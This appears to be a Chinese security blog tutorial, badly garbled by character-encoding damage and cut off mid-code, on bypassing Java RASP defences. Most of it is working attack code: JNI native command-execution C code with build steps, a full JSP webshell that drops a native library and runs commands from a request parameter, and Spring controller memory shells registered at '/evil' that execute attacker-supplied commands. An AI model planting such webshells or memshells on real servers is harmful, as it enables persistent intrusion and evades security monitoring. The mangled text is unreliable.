·åé¢æ‰“åŒ…æˆjaråŒ…çš„æ—¶å€™æ‰ä¼šæŠŠä¾èµ–ä¸€èµ·æ‰“åŒ…è¿›å» æ‰§è¡Œï¼šmvn clean packageè¿›è¡Œæ‰“åŒ… æ¨¡æ‹Ÿçš„æœåŠ¡å¦‚ä¸‹ï¼š package Test3;import static java.lang.Thread.sleep;public class Sleep public static void main(String[] args) throws Exception Runtime.getRuntime().exec(calc);// while(true)// hello();// sleep(3000);// public static void hello() System.out.println(Hello); è¿è¡Œè¯¥æ–‡ä»¶å‰æˆ‘ä»¬è¦å…ˆå¯¹å…¶è¿è¡Œé…ç½®è¿›è¡Œä¿®æ”¹ ä¿®æ”¹é€‰é¡¹é€‰æ‹©â€œæ·»åŠ è™šæ‹Ÿæœºé€‰é¡¹â€ ç„¶åè¾“å…¥javaagentå‚æ•°ï¼š-javaagent:E:\\mycode\\java_max\\java_agent\\target\\java_agent-1.0-SNAPSHOT-jar-with-dependencies.jar ç°åœ¨æ‰§è¡Œè¯¥æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥è§åˆ°è¢«ç›´æ¥æ‹¦ä¸‹æ¥äº† agentmainé€šè¿‡agentmainæ–¹æ³•æ¥è¿›è¡Œé˜²èŒƒçš„raspè™½ç„¶åœ¨javaè¿è¡Œçš„ä¼˜å…ˆçº§ä¸Šè½åäºpremainæ–¹æ³•ï¼Œä½†ä¹Ÿä¸å¤±æ˜¯ä¸€ä¸ªå¥½åŠæ³• è¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œå…·ä½“å¯è§ï¼šhttps://www.freebuf.com/articles/web/414700.html RASPç»•è¿‡åœ¨RASPé‡Œå…¶å®æ˜¯Hookæ‰äº†ä¸€äº›Runtimeã€ProcessBuilder ç­‰ç±»ï¼Œä½†æ˜¯Runtime.execè°ƒç”¨çš„æ˜¯ProcessBuilder.start,ProcessBuilder.startçš„åº•å±‚ä¼šè°ƒç”¨ProcessImplç±»ã€‚é‚£ä¹ˆè¿™æ—¶å€™åªéœ€è¦å»Hookæ‰ProcessImplå°±æ— æ³•è¿›è¡Œæ‰§è¡Œå‘½ä»¤äº†ã€‚é‚£ä¹ˆåƒè¿™ç§åŸºäºå †æ ˆè°ƒç”¨å»è¯†åˆ«çš„è¯¥æ€ä¹ˆå»ç»•è¿‡å‘¢ï¼Ÿ Java å‘½ä»¤æ‰§è¡Œçš„å‡ ç§æ–¹å¼ä¸­ï¼Œè¿½æº¯åˆ°åº•å±‚å…¶å®åªæœ‰ UNIXProcess å’Œ ProcessImpl æ ¹æ® RASP ä¸åŒçš„å®ç°ï¼Œé€šå¸¸æœ‰ä¸¤ç§æ–¹æ³•ç»•è¿‡ï¼š å¯»æ‰¾æ²¡æœ‰è¢«é™åˆ¶çš„ç±»æˆ–è€…å‡½æ•°æ¥ç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯ç»•è¿‡é»‘åå• åˆ©ç”¨æ›´åº•å±‚çš„æŠ€æœ¯è¿›è¡Œç»•è¿‡ï¼Œä¾‹å¦‚ä» C ä»£ç çš„å±‚é¢è¿›è¡Œç»•è¿‡ ç»•é»‘åå•ä»¥ MRCTF 2022 springcoffee ä¸­çš„ RASP ä¸ºä¾‹ï¼Œè¿™é“é¢˜å¯¹ java.lang.ProcessImpl.start å‡½æ•°è¿›è¡Œäº†è¿‡æ»¤ã€‚ public class RaspTransformer implements ClassFileTransformer private Instrumentation inst; private static String targetClassName = java.lang.ProcessImpl; private static String targetMethodName = start; public RaspTransformer(Instrumentation inst) this.inst = inst; public byte[] transform(ClassLoader loader, String className, Class? classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException if (className.replace(/, .).equals(targetClassName)) System.out.println([Vaccine] Start Patch JndiManager Lookup Method!); CtClass ctClass = null; CtMethod ctMethod = null; try ClassPool classPool = new ClassPool(); classPool.appendSystemPath(); if (loader != null) classPool.appendClassPath(new LoaderClassPath(loader)); ctClass = classPool.makeClass(new ByteArrayInputStream(classfileBuffer)); CtMethod[] var9 = ctClass.getMethods(); int var10 = var9.length; for(int var11 = 0; var11 var10; ++var11) CtMethod method = var9[var11]; if (method.getName().equals(targetMethodName)) ctMethod = method; break; assert ctMethod != null; ctMethod.insertBefore(return null;); System.out.println(String.format(Patch %s %s Success!, targetClassName, targetMethodName)); byte[] var18 = ctClass.toBytecode(); return var18; catch (Exception var16) var16.printStackTrace(); finally if (ctClass != null) ctClass.detach(); return classfileBuffer; else return classfileBuffer; Java å‘½ä»¤æ‰§è¡Œçš„å‡ ç§æ–¹å¼ä¸­ï¼Œè¿½æº¯åˆ°åº•å±‚å…¶å®åªæœ‰ UNIXProcess å’Œ ProcessImplï¼Œå› æ­¤è¿™é‡Œå¯ä»¥ç”¨ UNIXProcess è¿›è¡Œç»•è¿‡ã€‚ é€šè¿‡JNIç»•è¿‡é»‘åå•JNIï¼ˆJava Native Interfaceï¼‰æ˜¯ Java æä¾›çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨äºåœ¨ Java ç¨‹åºä¸­è°ƒç”¨æœ¬åœ°ï¼ˆNativeï¼‰ä»£ç ï¼Œå³ä½¿ç”¨å…¶ä»–è¯­è¨€ï¼ˆå¦‚Cã€C++ï¼‰ç¼–å†™çš„ä»£ç ï¼Œä»è€Œå¯ä»¥å……åˆ†åˆ©ç”¨æœ¬åœ°ä»£ç çš„åŠŸèƒ½å’Œæ€§èƒ½ä¼˜åŠ¿ï¼Œå®ç°å¯¹åº•å±‚ç³»ç»Ÿèµ„æºå’Œå¤–éƒ¨åº“çš„è®¿é—® JNIçš„åŸºæœ¬ä½¿ç”¨æ­¥éª¤å¯ä»¥å½’çº³ä¸ºå¦‚ä¸‹çš„äº”æ­¥ï¼š ç¼–å†™ä¸€ä¸ª java æ–‡ä»¶ï¼Œå…¶ä¸­å®šä¹‰ä¸€ä¸ª native æ–¹æ³•ï¼Œç„¶åä½¿ç”¨ javac ç¼–è¯‘å¾—åˆ° .class æ–‡ä»¶ ä½¿ç”¨ javah è¿›è¡Œå¯¹ .class æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œå¾—åˆ°ç¼–å†™ C ä»£ç æ‰€éœ€çš„å¤´æ–‡ä»¶ã€‚ ç¼–å†™å‘½ä»¤æ‰§è¡Œçš„ C è¯­è¨€å®ç° å°†ç¼–å†™çš„ C ä»£ç ç¼–è¯‘ä¸º lib æˆ–è€… dllï¼ˆæ³¨æ„jdkç‰ˆæœ¬è¦ä¸ç›®æ ‡æœºå™¨çš„jdkä¿æŒä¸€è‡´ï¼‰ ç¼–å†™ä¸€ä¸ª Java ç±»è°ƒç”¨ System.loadLibrary æ–¹æ³•åŠ è½½ dll æ–‡ä»¶ã€‚ ç¬¬ä¸€æ­¥ï¼šç¼–å†™ native æ–¹æ³•æ–°å»ºä¸€ä¸ª NativeLibraryExample ç±»ï¼š public class NativeLibraryExample // å£°æ˜nativeæ–¹æ³• public native String nativeMethod(String cmd); public static void main(String[] args) NativeLibraryExample example = new NativeLibraryExample(); example.nativeMethod(calc.exe); // è°ƒç”¨nativeæ–¹æ³• ä½¿ç”¨ javac å¯¹å…¶è¿›è¡Œç¼–è¯‘ï¼š javac NativeLibraryExample.java å¾—åˆ°äº† NativeLibraryExample.class æ–‡ä»¶ ç¬¬äºŒæ­¥ï¼šä½¿ç”¨ javah ç”Ÿæˆå¤´æ–‡ä»¶ä½¿ç”¨ javah ç”Ÿæˆå¯¹åº”çš„å¤´æ–‡ä»¶ã€‚ javah -jni NativeLibraryExample å¾—åˆ° NativeLibraryExample.h ä» JDK 8 å¼€å§‹ï¼Œæ¨èä½¿ç”¨ javacå‘½ä»¤çš„ -hé€‰é¡¹æ¥ä¸€æ­¥å®Œæˆç¼–è¯‘å’Œå¤´æ–‡ä»¶ç”Ÿæˆï¼Œè¿™æ›´ç®€å•ç›´æ¥ # ç›´æ¥å¯¹ .java æºæ–‡ä»¶æ“ä½œï¼ŒåŒæ—¶å®Œæˆç¼–è¯‘å’Œç”Ÿæˆå¤´æ–‡ä»¶javac -h . NativeLibraryExample.java ç¬¬ä¸‰æ­¥ï¼šç¼–å†™ C ä»£ç ç¼–å†™ C è¯­è¨€å®ç°ï¼ŒåŒ…å«ä¸Šä¸€æ­¥ç”Ÿæˆçš„ .h æ–‡ä»¶: ç¡®ä¿Cå‡½æ•°åä¸¥æ ¼éµå¾ªJava_åŒ…å_ç±»å_æ–¹æ³•åçš„å‘½åè§„èŒƒ JniClass.c #include jni.h#include Test4_NativeLibraryExample.h#include string.h#include stdio.h#include sys/types.h#include unistd.h#include stdlib.hint execmd(const char *cmd, char *result) char buffer[1024*12]; //å®šä¹‰ç¼“å†²åŒº FILE *pipe = popen(cmd, r); //æ‰“å¼€ç®¡é“ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤ if (!pipe) return 0; //è¿”å›0è¡¨ç¤ºè¿è¡Œå¤±è´¥ while (!feof(pipe)) if (fgets(buffer, sizeof(buffer), pipe)) //å°†ç®¡é“è¾“å‡ºåˆ°resultä¸­ strcat(result, buffer); pclose(pipe); //å…³é—­ç®¡é“ return 1; //è¿”å›1è¡¨ç¤ºè¿è¡ŒæˆåŠŸJNIEXPORT jstring JNICALL Java_Test4_NativeLibraryExample_nativeMethod(JNIEnv *env, jobject obj, jstring jstr) const char *cstr = (*env)-GetStringUTFChars(env, jstr, NULL); char result[1024 * 12] = ; //å®šä¹‰å­˜æ”¾ç»“æœçš„å­—ç¬¦ä¸²æ•°ç»„ if (1 == execmd(cstr, result)) // printf(result); char return_messge[100] = ; strcat(return_messge, result); jstring cmdresult = (*env)-NewStringUTF(env, return_messge); //system(); return cmdresult; ç¬¬å››æ­¥ï¼šç¼–è¯‘æˆ dll æˆ–è€… libLinux ä¸‹ä½¿ç”¨çš„å‘½ä»¤è¿›è¡Œç¼–è¯‘ï¼Œç¼–è¯‘æ—¶éœ€è¦æ·»åŠ  jdk include ç›®å½•å’Œ inlcudelinux ç›®å½•ã€‚ gcc -fPIC -I$JAVA_HOME/include -I$JAVA_HOME/include/linux -shared -o libcmd.so JniClass.c windows ç¯å¢ƒä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤(åœ¨cmdä¸­) gcc -I%JAVA_HOME%\\include -I%JAVA_HOME%\\include\\win32 -shared -o libcmd.dll JniClass.c ç¬¬äº”æ­¥ï¼šåŠ è½½ so æ–‡ä»¶ä¿®æ”¹ NativeLibraryExample çš„ main æ–¹æ³•ï¼Œä½¿ç”¨ System.load å°† so æ–‡ä»¶åŠ è½½è¿›æ¥ã€‚ public class NativeLibraryExample // å£°æ˜nativeæ–¹æ³• public native String nativeMethod(String cmd); public static void main(String[] args) System.load(E:\\\\mycode\\\\java_max\\\\java_agent\\\\src\\\\main\\\\java\\\\Test4\\\\libcmd.dll); NativeLibraryExample example = new NativeLibraryExample(); example.nativeMethod(calc.exe); // è°ƒç”¨nativeæ–¹æ³• è°ƒç”¨ nativeMethod æ‰§è¡Œå‘½ä»¤ å®é™…åœºæ™¯ä¸‹çš„ JNI åˆ©ç”¨å®é™…æ¸—é€åœºæ™¯ä¸­é€šå¸¸éœ€è¦å…ˆå°†æ¶æ„é“¾æ¥åº“æ”¾å…¥æœåŠ¡å™¨ä¸­ï¼Œå¤§è‡´å¯ä»¥åˆ†ä¸ºå¦‚ä¸‹çš„ä¸¤ç§æƒ…å½¢ï¼š å…ˆåˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´å°†ç¼–è¯‘å¥½çš„ so æˆ–è€… dll æ”¾å…¥æœåŠ¡å™¨ä¸­ï¼Œç„¶åå†åŠ è½½è¿è¡Œã€‚ å…ˆåˆ©ç”¨ webshell å°† so æˆ– dll å†™å…¥æœåŠ¡å™¨ï¼Œç„¶åå†åŠ è½½è¿è¡Œã€‚ JSP webshelljavasec ä¸­çš„ JSP ç¤ºä¾‹å¦‚ä¸‹ï¼Œå…¶ä»£ç çš„å®ç°ä¸æ­£å‘å¼€å‘æœ‰ä¸€äº›åŒºåˆ«ï¼š å°†å®šä¹‰çš„ Java è½¬åŒ–ä¸ºå­—èŠ‚æ•°ç»„ï¼Œé€šè¿‡ defineClass å¯¹å…¶è¿›è¡ŒåŠ è½½ï¼Œä»è€Œè·å–åˆ°å®šä¹‰äº† native æ–¹æ³•çš„ Java ç±»ã€‚ å°† so æ–‡ä»¶å†…å®¹çš„ base64 ç¼–ç å®šä¹‰ä¸ºå¸¸é‡ï¼ŒåŠ è½½è¿™ä¸ª jsp æ—¶ï¼Œå°† so çš„å†…å®¹å†™å…¥åˆ°æœåŠ¡å™¨ä¸´æ—¶æ–‡ä»¶ç›®å½•ä¸‹ã€‚ åŠ è½½ so æ—¶ï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨ System.load å‡½æ•°ï¼Œè€Œæ˜¯ä½¿ç”¨ ClassLoader.loadLibrary0 æ–¹æ³•ã€‚å®é™…ä¸Š System.load åº•å±‚ä¹Ÿæ˜¯è°ƒç”¨çš„ ClassLoader.loadLibrary0ã€‚ è°ƒç”¨è¿‡ç¨‹é‡‡ç”¨åå°„å®Œæˆã€‚ %@ page contentType=text/html;charset=UTF-8 language=java %%@ page import=java.io.File %%@ page import=java.io.FileOutputStream %%@ page import=java.io.IOException %%@ page import=java.lang.reflect.Method %%-- load_library_cmd_all.jsp?cmd=ls --%%-- é€šè¿‡JNIçš„æ–¹å¼è°ƒç”¨åŠ¨æ€é“¾æ¥åº“, åå°„è°ƒç”¨ ClassLoader çš„ loadLibrary0 æ–¹æ³•è¿›è¡ŒåŠ è½½ --%%! private static final String COMMAND_CLASS_NAME = com.anbai.sec.cmd.CommandExecution; /** * JDK1.5ç¼–è¯‘çš„com.anbai.sec.cmd.CommandExecutionç±»å­—èŠ‚ç , * åªæœ‰ä¸€ä¸ªpublic static native String exec(String cmd);çš„æ–¹æ³• */ private static final byte[] COMMAND_CLASS_BYTES = new byte[] -54, -2, -70, -66, 0, 0, 0, 49, 0, 15, 10, 0, 3, 0, 12, 7, 0, 13, 7, 0, 14, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 4, 101, 120, 101, 99, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 21, 67, 111, 109, 109, 97, 110, 100, 69, 120, 101, 99, 117, 116, 105, 111, 110, 46, 106, 97, 118, 97, 12, 0, 4, 0, 5, 1, 0, 34, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 109, 100, 47, 67, 111, 109, 109, 97, 110, 100, 69, 120, 101, 99, 117, 116, 105, 111, 110, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 2, 0, 3, 0, 0, 0, 0, 0, 2, 0, 1, 0, 4, 0, 5, 0, 1, 0, 6, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 7, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 1, 9, 0, 8, 0, 9, 0, 0, 0, 1, 0, 10, 0, 0, 0, 2, 0, 11 ; /** * è·å–JNIé“¾æ¥åº“ç›®å½• * @return è¿”å›ç¼“å­˜JNIçš„ä¸´æ—¶ç›®å½• */ File getTempJNILibFile() File jniDir = new File(System.getProperty(java.io.tmpdir), jni-lib); if (!jniDir.exists()) jniDir.mkdir(); String filename; if (isWin()) filename = cmd.dll; else if (isMac()) filename = libcmd.lib; else filename = libcmd.so; return new File(jniDir, filename); boolean isWin() return (System.getProperty(os.name) != null System.getProperty(os.name).startsWith(Win)); boolean isWin32() return 32.equals(System.getProperty(sun.arch.data.model)); boolean isMac() return (System.getProperty(os.name) != null System.getProperty(os.name).startsWith(Mac)); /** * é«˜ç‰ˆæœ¬JDKsun.misc.BASE64Decoderå·²ç»è¢«ç§»é™¤ï¼Œä½ç‰ˆæœ¬JDKåˆæ²¡æœ‰java.util.Base64å¯¹è±¡ï¼Œ * æ‰€ä»¥è¿˜ä¸å¦‚ç›´æ¥åå°„è‡ªåŠ¨æ‰¾è¿™ä¸¤ä¸ªç±»ï¼Œå“ªä¸ªå­˜åœ¨å°±ç”¨é‚£ä¸ªdecodeã€‚ * @param str * @return */ byte[] base64Decode(String str) try try Class clazz = Class.forName(sun.misc.BASE64Decoder); return (byte[]) clazz.getMethod(decodeBuffer, String.class).invoke(clazz.newInstance(), str); catch (ClassNotFoundException e) Class clazz = Class.forName(java.util.Base64); Object decoder = clazz.getMethod(getDecoder).invoke(null); return (byte[]) decoder.getClass().getMethod(decode, String.class).invoke(decoder, str); catch (Exception e) return null; /** * å†™JNIé“¾æ¥åº“æ–‡ä»¶ * @param base64 JNIåŠ¨æ€åº“Base64 * @return è¿”å›æ˜¯å¦å†™å…¥æˆåŠŸ */ void writeJNILibFile(String base64) throws IOException if (base64 != null) File jniFile = getTempJNILibFile(); if (!jniFile.exists()) byte[] bytes = base64Decode(base64); if (bytes != null) FileOutputStream fos = new FileOutputStream(jniFile); fos.write(bytes); fos.flush(); fos.close(); %% String cmd = request.getParameter(cmd); String jniBytes = request.getParameter(jni); String COMMAND_JNI_FILE_BYTES; if (isWin()) if (isWin32()) // windows 32 COMMAND_JNI_FILE_BYTES = çœç•¥å…·ä½“çš„Base64ç¼–ç ä¿¡æ¯ï¼Œè¯·å‚è€ƒjavaweb-sec/javaweb-sec-source/javasec-test/javasec-vuls-struts2/src/main/webapp/modules/jni/loadlibrary.jsp; else // windows 64 COMMAND_JNI_FILE_BYTES = çœç•¥å…·ä½“çš„Base64ç¼–ç ä¿¡æ¯ï¼Œè¯·å‚è€ƒjavaweb-sec/javaweb-sec-source/javasec-test/javasec-vuls-struts2/src/main/webapp/modules/jni/loadlibrary.jsp; else if (isMac()) // mac COMMAND_JNI_FILE_BYTES = çœç•¥å…·ä½“çš„Base64ç¼–ç ä¿¡æ¯ï¼Œè¯·å‚è€ƒjavaweb-sec/javaweb-sec-source/javasec-test/javasec-vuls-struts2/src/main/webapp/modules/jni/loadlibrary.jsp; else // centos 7 64 COMMAND_JNI_FILE_BYTES = çœç•¥å…·ä½“çš„Base64ç¼–ç ä¿¡æ¯ï¼Œè¯·å‚è€ƒjavaweb-sec/javaweb-sec-source/javasec-test/javasec-vuls-struts2/src/main/webapp/modules/jni/loadlibrary.jsp; // JNIè·¯å¾„ File jniFile = getTempJNILibFile(); ClassLoader loader = (ClassLoader) application.getAttribute(__LOADER__); if (loader == null) loader = new ClassLoader(this.getClass().getClassLoader()) @Override protected Class? findClass(String name) throws ClassNotFoundException try return super.findClass(name); catch (ClassNotFoundException e) return defineClass(COMMAND_CLASS_NAME, COMMAND_CLASS_BYTES, 0, COMMAND_CLASS_BYTES.length); ; writeJNILibFile(jniBytes != null ? jniBytes : COMMAND_JNI_FILE_BYTES);// å†™JNIæ–‡ä»¶åˆ°ä¸´æ—¶æ–‡ä»¶ç›®å½• application.setAttribute(__LOADER__, loader); try // loadå‘½ä»¤æ‰§è¡Œç±» Class commandClass = loader.loadClass(com.anbai.sec.cmd.CommandExecution); Object loadLib = application.getAttribute(__LOAD_LIB__); if (loadLib == null || !((Boolean) loadLib)) Method loadLibrary0Method = ClassLoader.class.getDeclaredMethod(loadLibrary0, Class.class, File.class); loadLibrary0Method.setAccessible(true); loadLibrary0Method.invoke(loader, commandClass, jniFile); application.setAttribute(__LOAD_LIB__, true); String content = (String) commandClass.getMethod(exec, String.class).invoke(null, cmd); out.println(pre); out.println(content); out.println(/pre); catch (Exception e) out.println(e.toString()); throw e; % ä»£ç ä¸­çš„ COMMAND_JNI_FILE_BYTES å†…å®¹è¾ƒå¤§ï¼Œå…·ä½“æ–‡ä»¶å†…å®¹å¯è§ï¼šjavaweb-secjavaweb-sec-sourcejavasec-testjavasec-vuls-struts2srcmainwebappmodulesjniloadlibrary.jsp at master Â· javaweb-secjavaweb-sec Â· GitHub è„šæœ¬ä¸­éœ€è¦å…ˆå°† .class è½¬åŒ–ä¸ºå­—èŠ‚æ•°ç»„ï¼Œä»£ç å¦‚ä¸‹ï¼š public static byte[] getBytesArrayFromClassFile(String classFilePath) throws Exception byte[] classBytes = Files.readAllBytes(Paths.get(classFilePath)); for(byte b : classBytes) System.out.print(b); System.out.print(,); return classBytes; ååºåˆ—åŒ–åˆ©ç”¨ååºåˆ—åŒ–åˆ©ç”¨æ—¶å®ç°åŸç†ä¸ JSP ä¸€è‡´ï¼Œä¹ŸåŒæ ·éœ€è¦å°† so æ–‡ä»¶å†…å®¹çš„ base64 ç¼–ç å®šä¹‰ä¸ºå¸¸é‡ï¼Œåœ¨ååºåˆ—åŒ–è§¦å‘æ—¶ï¼Œå°† so çš„å†…å®¹å†™å…¥åˆ°æœåŠ¡å™¨ä¸´æ—¶æ–‡ä»¶ç›®å½•ä¸‹ï¼Œå†è¿›è¡ŒåŠ è½½ã€‚ æˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ªæ™®é€šçš„ controller å†…å­˜é©¬çš„åŸºç¡€ä¸Šï¼Œå°†å…¶æ”¹é€ æˆ JNI å†…å­˜é©¬ã€‚controller å†…å­˜é©¬å¦‚ä¸‹, è¯¥å†…å­˜é©¬é‡å†™äº† index æ–¹æ³•ï¼Œå¹¶åœ¨é™æ€ä»£ç å—ä¸­å°†è‡ªèº«æ·»åŠ åˆ° RequestMapping ä¸­ã€‚ import org.springframework.web.bind.annotation.ResponseBody;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import org.springframework.web.util.pattern.PathPatternParser;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Map;import java.util.Scanner;public class SpringControllerMemshell static String inject_uri = /evil; try System.out.println(Controller Injecting); WebApplicationContext context = (WebApplicationContext) RequestContextHolder. currentRequestAttributes().getAttribute(org.springframework.web.servlet.DispatcherServlet.CONTEXT, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField(mappingRegistry); f.setAccessible(true); Object mappingRegistry = f.get(mappingHandlerMapping); Class? c = Class.forName(org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry); Field field = null; try field = c.getDeclaredField(urlLookup); field.setAccessible(true); catch (NoSuchFieldException e) field = c.getDeclaredField(pathLookup); field.setAccessible(true); MapString, Object urlLookup = (MapString, Object) field.get(mappingRegistry); for (String urlPath : urlLookup.keySet()) if (inject_uri.equals(urlPath)) throw new RuntimeException(); Class ? evilClass = SpringControllerMemshell.class; Method method2 = evilClass.getMethod(index); RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration(); option.setPatternParser(new PathPatternParser()); RequestMappingInfo info = RequestMappingInfo.paths(inject_uri).options(option).build(); // å°†è¯¥controlleræ³¨å†Œåˆ°Springå®¹å™¨ mappingHandlerMapping.registerMapping(info, evilClass.newInstance(), method2); System.out.println(Controller Injected); catch (Exception e) e.printStackTrace(); @ResponseBody public void index() throws IOException // è·å–è¯·æ±‚ HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); // è·å–è¯·æ±‚çš„å‚æ•°cmdå¹¶æ‰§è¡Œ // ç±»ä¼¼äºPHPçš„system($_GET[cmd]) try String cmd = request.getParameter(cmd); if (cmd != null cmd.length() 0) String osTyp = System.getProperty(os.name); InputStream in = Runtime.getRuntime().exec((osTyp != null osTyp.toLowerCase().contains(win)) ? new String[]cmd.exe, /c, request.getParameter(cmd):new String[]sh, -c, request.getParameter(cmd)).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\\\\a); String output = s.hasNext() ? s.next() : ; response.getWriter().write(output); response.getWriter().flush(); return; catch (Exception e) e.printStackTrace(); åœ¨å…¶åŸºç¡€ä¸Šæ–°å»ºä¸€ä¸ª SpringControllerMemshell ç±»ï¼Œè¿›è¡Œå¦‚ä¸‹çš„ä¿®æ”¹ï¼š æ·»åŠ ä¸€ä¸ª native æ–¹æ³• å°†åŸæœ‰çš„ index æ–¹æ³•æ”¹ä¸ºæ‰§è¡Œ doExec æ–¹æ³•ã€‚ æ·»åŠ ä¸€ä¸ªæˆå‘˜å˜é‡ jniCodesï¼Œç”¨äºå­˜æ”¾ base64 ç¼–ç åçš„ so æ–‡ä»¶å†…å®¹ã€‚ æ·»åŠ ä¸€ä¸ª getJNILibFile æ–¹æ³•ï¼Œç”¨äºåœ¨ tmp ç›®å½•ä¸‹å†™å…¥ so æ–‡ä»¶ï¼Œå¹¶è¿”å›æ–‡ä»¶è·¯å¾„ã€‚ åœ¨ static ä»£ç å—ä¸­ä½¿ç”¨ System.load åŠ è½½ so æ–‡ä»¶ã€‚ æ–‡ä»¶å†…å®¹ä¿®æ”¹å¦‚ä¸‹ï¼š import org.springframework.web.bind.annotation.ResponseBody;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import org.springframework.web.util.pattern.PathPatternParser;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Base64;import java.util.Map;public class SpringControllerJNIMemshell final static String jniCodes = ;getJNILibFile static String inject_uri = /evil; try System.load(getJNILibFile(jniCodes)); System.out.println(Controller Injecting); WebApplicationContext context = (WebApplicationContext) RequestContextHolder. currentRequestAttributes().getAttribute(org.springframework.web.servlet.DispatcherServlet.CONTEXT, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField(mappingRegistry); f.setAccessible(true); Object mappingRegistry = f.get(mappingHandlerMapping); Class? c = Class.forName(org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry); Field field = null; try field = c.getDeclaredField(urlLookup); field.setAccessible(true); catch (NoSuchFieldException e) field = c.getDeclaredField(pathLookup); field.setAccessible(true); MapString, Object urlLookup = (MapString, Object) field.get(mappingRegistry); for (String urlPath : urlLookup.keySet()) if (inject_uri.equals(urlPath)) throw new RuntimeException(); Class ? evilClass = SpringControllerJNIMemshell.class; Method method2 = evilClass.getMethod(index); RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration(); option.setPatternParser(new PathPatternParser()); RequestMappingInfo info = RequestMappingInfo.paths(inject_uri).options(option).build(); // å°†è¯¥controlleræ³¨å†Œåˆ°Springå®¹å™¨ mappingHandlerMapping.registerMapping(info, evilClass.newInstance(), method2); System.out.println(Controller Injected); catch (Exception e) e.printStackTrace(); public native String doExec(String cmd); /** * å†™JNIé“¾æ¥åº“æ–‡ä»¶ * @param base64 JNIåŠ¨æ€åº“Base64 * @return è¿”å›æ˜¯å¦å†™å…¥æˆåŠŸ */ public static String getJNILibFile(String base64) throws IOException if (base64 != null) File jniDir = new File(System.getProperty(java.io.tmpdir), jni-lib); if (!jniDir.exists()) jniDir.mkdir(); String filename; filename = slib.so; File jniFile = new File(jniDir, filename); if (!jniFile.exists()) byte[] bytes = Base64.getDecoder().decode(jniCodes); if (bytes != null) FileOutputStream fos = new FileOutputStream(jniFile); fos.write(bytes); fos.flush(); fos.close(); return jniFile.getAbsolutePath(); return ; @ResponseBody public void index() throws IOException HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); try String cmd = request.getParameter(cmd); if (cmd != null cmd.length() 0) response.getWriter().write(doExec(cmd)); response.getWriter().flush(); return; catch (Exception e) e.printStackTrace(); æ¥ç€å°±æ˜¯å¸¸è§„çš„æ­¥éª¤ï¼š ä½¿ç”¨ javac è¿›è¡Œç¼–è¯‘ ä½¿ç”¨ javah ç”Ÿæˆ .h æ–‡ä»¶ ç¼–å†™ c ä»£ç ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š #includejni.h#includestdio.h#includecstdlib#includecstring#include xyz_eki_marshalexp_memshell_SpringBoot_Controller_SpringControllerJNIMemshell.h int execmd(const char *cmd, char *result) char buffer[1024*12]; //å®šä¹‰ç¼“å†²åŒº FILE *pipe = popen(cmd, r); //æ‰“å¼€ç®¡é“ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤ if (!pipe) return 0; //è¿”å›0è¡¨ç¤ºè¿è¡Œå¤±è´¥ while 